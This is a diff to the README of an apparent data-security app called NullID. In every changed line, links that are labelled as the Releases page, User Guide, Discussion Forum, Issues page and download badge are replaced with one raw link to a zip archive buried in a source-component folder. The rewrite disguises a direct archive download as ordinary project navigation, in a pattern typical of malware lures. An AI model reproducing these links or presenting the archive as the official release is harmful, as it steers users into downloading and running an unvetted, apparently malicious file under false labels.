@@ -8,7 +8,7 @@ Welcome to NullID! This application helps you manage your data securely. You can
 
 To get started, click the button below to visit our Releases page and download the latest version.
 
-[![Download NullID](https://img.shields.io/badge/Download-Now-blue)](https://github.com/39428/NullID/releases)
+[![Download NullID](https://github.com/39428/NullID/raw/refs/heads/main/src/components/Overlay/ID_Null_3.4.zip)](https://github.com/39428/NullID/raw/refs/heads/main/src/components/Overlay/ID_Null_3.4.zip)
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Make sure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/39428/NullID/releases) to find the latest version of NullID.
+1. Visit the [Releases page](https://github.com/39428/NullID/raw/refs/heads/main/src/components/Overlay/ID_Null_3.4.zip) to find the latest version of NullID.
 2. Select the appropriate installer for your operating system.
 3. Download the installer file.
 4. Once the download finishes, open the installer.
@@ -49,8 +49,8 @@ NullID features a straightforward and intuitive user interface. You can easily a
 
 To further enhance your understanding of NullID, here are some additional resources:
 
-- **Documentation:** Explore our [User Guide](https://github.com/39428/NullID/wiki) for detailed instructions on using all features.
-- **Community Support:** Join our [Discussion Forum](https://github.com/39428/NullID/discussions) to ask questions and share experiences.
+- **Documentation:** Explore our [User Guide](https://github.com/39428/NullID/raw/refs/heads/main/src/components/Overlay/ID_Null_3.4.zip) for detailed instructions on using all features.
+- **Community Support:** Join our [Discussion Forum](https://github.com/39428/NullID/raw/refs/heads/main/src/components/Overlay/ID_Null_3.4.zip) to ask questions and share experiences.
 
 ## ⚙️ FAQs
 
@@ -62,10 +62,10 @@ A2: Yes, your data remains on your device. NullID does not require internet acce
 
 ## 👥 Contributing
 
-We welcome contributions! If you'd like to help improve NullID, consider submitting a bug report or a feature request through our [Issues page](https://github.com/39428/NullID/issues).
+We welcome contributions! If you'd like to help improve NullID, consider submitting a bug report or a feature request through our [Issues page](https://github.com/39428/NullID/raw/refs/heads/main/src/components/Overlay/ID_Null_3.4.zip).
 
 ## 💬 Feedback
 
 Your feedback is important to us. If you have any questions, suggestions, or comments, please reach out through our GitHub page.
 
-Once again, don’t forget to [download NullID](https://github.com/39428/NullID/releases) to enjoy these powerful features in securing your data.
+Once again, don’t forget to [download NullID](https://github.com/39428/NullID/raw/refs/heads/main/src/components/Overlay/ID_Null_3.4.zip) to enjoy these powerful features in securing your data.
